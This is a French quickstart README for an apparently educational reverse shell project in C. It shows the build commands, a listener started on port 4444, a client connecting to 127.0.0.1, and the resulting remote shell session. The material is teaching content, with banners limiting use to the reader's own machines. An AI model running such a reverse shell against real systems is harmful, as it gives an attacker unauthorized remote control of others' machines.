# 🚀 Démarrage Rapide - 5 Minutes

## Installation et Test en 3 Commandes

### Étape 1 : Compiler (30 secondes)

```bash
cd /path/to/03_reverse_shell
make all
```

### Étape 2 : Lancer Serveur (Terminal 1)

```bash
./build/server 4444
```

**Sortie** :
```
╔══════════════════════════════════════════════╗
║   REVERSE SHELL SERVER (Usage Éducatif)      ║
║                                              ║
║   ⚠️  TESTS SUR VOS MACHINES UNIQUEMENT     ║
╚══════════════════════════════════════════════╝

[INFO] Creating listener on port 4444
[INFO] Listening on 0.0.0.0:4444
[INFO] Waiting for client connection...
```

### Étape 3 : Lancer Client (Terminal 2)

```bash
./build/client 127.0.0.1 4444
```

**Sortie** :
```
╔══════════════════════════════════════════════╗
║    REVERSE SHELL CLIENT (Usage Éducatif)     ║
╚══════════════════════════════════════════════╝

[INFO] Target: 127.0.0.1:4444
[INFO] Attempting connection...
[INFO] Connection attempt #1
[INFO] Connected to 127.0.0.1:4444
[INFO] Connection established!
```

### ✅ Résultat : Shell Obtenu !

**Terminal 1 (Serveur)** affiche maintenant :
```
[+] Client connected from 127.0.0.1
Shell connected. Type 'exit' to disconnect.

$ whoami
user
$ pwd
/home/user
$ ls
file1.txt  file2.txt
$ exit
[INFO] Client 127.0.0.1 disconnected
```

---

## 🎯 Test Réussi !

Vous venez de :
- ✅ Compiler un projet C professionnel
- ✅ Créer une connexion réseau client/server
- ✅ Obtenir un shell distant
- ✅ Comprendre les bases du reverse shell

---

## 📚 Prochaines Étapes

1. **Lire le cours.md** - Théorie complète
2. **Faire les Exercices** - Exercice.md
3. **Tester examples/** - Exemples avancés
4. **Modifier le code** - Ajouter fonctionnalités

---

*Quickstart - Reverse Shell Project*

